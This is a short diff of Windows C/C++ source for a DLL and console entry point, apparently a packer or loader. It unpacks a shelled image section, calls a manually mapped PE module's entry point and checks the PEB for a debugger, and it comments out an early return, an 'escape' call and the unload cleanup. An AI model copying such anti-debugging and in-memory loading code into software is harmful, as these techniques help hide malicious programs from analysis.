@@ -41,9 +41,10 @@ HINSTANCE ghPrevInstance = 0;
 LPSTR glpCmdLine = 0;
 int gnShowCmd = 0;
 
-
-
 HANDLE g_mutex_handle = 0;
+
+
+
 
 
 
@@ -58,9 +59,9 @@ int __stdcall DllMain(_In_ HINSTANCE hInstance, _In_ DWORD fdwReason, _In_ LPVOI
 		ret = getapi();
 
 #ifndef _DEBUG
-		if (Debug::PEB_BegingDebugged())
+		if (Debug::isDebugged())
 		{
-			return TRUE;
+			//return TRUE;
 		}
 #endif
 
@@ -68,17 +69,15 @@ int __stdcall DllMain(_In_ HINSTANCE hInstance, _In_ DWORD fdwReason, _In_ LPVOI
 
 		ghThisHandle = (char*)hInstance;
 		ret = Section::unshellSection((char*)hInstance, secname);
-
 	}
 	else if (fdwReason == DLL_PROCESS_DETACH)
 	{
-		if (glpDllMainEntry != 0 && ghPEModule != 0)
-		{
-			int ret = glpDllMainEntry((char*)ghPEModule, DLL_PROCESS_DETACH, 0);
-
-			lpVirtualFree(ghPEModule, gPEImageSize, MEM_DECOMMIT);
-			lpVirtualFree(ghPEModule, 0, MEM_RELEASE);
-		}
+		//if (glpDllMainEntry != 0 && ghPEModule != 0)
+		//{
+		//	ret = glpDllMainEntry((char*)ghPEModule, DLL_PROCESS_DETACH, 0);
+		//	lpVirtualFree(ghPEModule, gPEImageSize, MEM_DECOMMIT);
+		//	lpVirtualFree(ghPEModule, 0, MEM_RELEASE);
+		//}
 	}
 
 	return TRUE;
@@ -160,12 +159,12 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 #ifdef _MYCONSOLE
 int main(int argc, char** argv) {
 	int ret = 0;
-	ret = Escape::escape();
+	//ret = Escape::escape();
 
 	ret = getapi();
 
 #ifndef _DEBUG
-	if (Debug::PEB_BegingDebugged())
+	if (Debug::isDebugged())
 	{
 		return FALSE;
 	}
